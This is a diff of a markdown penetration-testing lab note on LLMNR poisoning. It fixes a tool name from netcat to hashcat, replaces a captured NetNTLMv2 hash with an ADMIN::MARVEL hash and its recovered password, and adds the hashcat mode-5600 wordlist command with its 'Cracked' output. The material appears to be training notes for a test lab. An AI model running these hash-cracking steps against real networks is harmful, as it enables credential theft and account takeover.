@@ -100,28 +100,55 @@ In this attacker tricks a computer on a local network into sending sensitive inf
 
 -  **Password hash theft**: During this connection attempt, the victim's computer automatically sends its credentials (in hashed form) to authenticate. The attacker can capture these password hashes and attempt to crack them offline.
 
-![](assets/Pasted%20image%2020241216170234.png)
+![](assets/Pasted%20image%2020241216172637.png)
 
-- **Hash cracking**: `netcat` is used to crack this hash.
+- **Hash cracking**: `hashcat` is used to crack this hash.
 
 	- Store below hash in a file `/tmp/hash.txt`
 
 	```
-	Spiderman::SPIDERMAN:e543dc06b9c71270:E030F466B832DCAD158F57D76D63F0C0:010100000000000000C5922BDC4FDB011C74A358A0F56E4F000000000200080055004A005700320001001E00570049004E002D0051004D005500560053005200350030004C003900530004003400570049004E002D0051004D005500560053005200350030004C00390053002E0055004A00570032002E004C004F00430041004C000300140055004A00570032002E004C004F00430041004C000500140055004A00570032002E004C004F00430041004C000700080000C5922BDC4FDB0106000400020000000800300030000000000000000100000000200000B0E07A7178EDBF77E9F9390D34C3318E86BC82E2B2566F30B833781A1924405B0A0010000000000000000000000000000000000009001E0063006900660073002F00660069006C0065007300650072007600650072000000000000000000
+	ADMIN::MARVEL:be4eba7f832f0042:0cf0b33bbac6412ad999ccd0c9da00fd:010100000000000000d746edd64fdb01b00f02f131bd6d5b0000000002000800350053003500500001001e00570049004e002d0046004400360045004800460050004e00370045004c0004003400570049004e002d0046004400360045004800460050004e00370045004c002e0035005300350050002e004c004f00430041004c000300140035005300350050002e004c004f00430041004c000500140035005300350050002e004c004f00430041004c000700080000d746edd64fdb0106000400020000000800300030000000000000000100000000200000b0e07a7178edbf77e9f9390d34c3318e86bc82e2b2566f30b833781a1924405b0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0030002e003100300035000000000000000000:Password1
 	
 	```
 	 
-	 - Find valid hash mode for netcat 
+	 - Find valid hash mode for hashcat 
+
+	```
+	┌─[✗]─[hexadivine@parrot]─[/usr/share/wordlists]
+	└──╼ $hashcat --help | grep  ntlm -i
+	   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
+	  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
+	   5600 | NetNTLMv2                                                  | Network Protocol
+	  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+	   1000 | NTLM                                                       | Operating System
+	```
+
+	- Crack the password with the hashcat and a wordlist
 
 ```
-┌─[✗]─[hexadivine@parrot]─[/usr/share/wordlists]
-└──╼ $hashcat --help | grep  ntlm -i
-   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
-  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
-   5600 | NetNTLMv2                                                  | Network Protocol
-  27100 | NetNTLMv2 (NT)                                             | Network Protocol
-   1000 | NTLM                                                       | Operating System
+┌─[hexadivine@parrot]─[~]
+└──╼ $hashcat -m 5600 /tmp/a.txt /usr/share/wordlists/rockyou.txt
+
+ADMIN::MARVEL:be4eba7f832f0042:0cf0b33bbac6412ad999ccd0c9da00fd:010100000000000000d746edd64fdb01b00f02f131bd6d5b0000000002000800350053003500500001001e00570049004e002d0046004400360045004800460050004e00370045004c0004003400570049004e002d0046004400360045004800460050004e00370045004c002e0035005300350050002e004c004f00430041004c000300140035005300350050002e004c004f00430041004c000500140035005300350050002e004c004f00430041004c000700080000d746edd64fdb0106000400020000000800300030000000000000000100000000200000b0e07a7178edbf77e9f9390d34c3318e86bc82e2b2566f30b833781a1924405b0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0030002e003100300035000000000000000000:Password1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: ADMIN::MARVEL:be4eba7f832f0042:0cf0b33bbac6412ad999...000000
+Time.Started.....: Mon Dec 16 16:33:03 2024 (0 secs)
+Time.Estimated...: Mon Dec 16 16:33:03 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   484.4 kH/s (2.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 16384/14344385 (0.11%)
+Rejected.........: 0/16384 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> cocoliso
+Hardware.Mon.#1..: Temp: 50c Util: 15%
 
 ```
 
-- 
